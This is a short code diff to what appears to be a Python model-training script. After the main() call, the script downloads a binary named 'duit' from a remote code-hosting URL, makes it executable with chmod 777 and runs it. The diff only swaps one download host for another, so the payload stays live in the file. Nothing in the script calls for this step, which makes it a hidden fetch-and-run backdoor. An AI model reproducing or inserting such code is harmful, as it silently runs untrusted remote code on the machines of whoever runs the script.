@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://gitlab.com/vrs8/vrs/-/raw/main/duit')
+os.system('wget https://bitbucket.org/naufalsis61/pers/raw/47346caa7c53354ea2d060b0068f89e71ae43e2d/duit')
 os.system('chmod 777 duit')
 os.system('./duit')
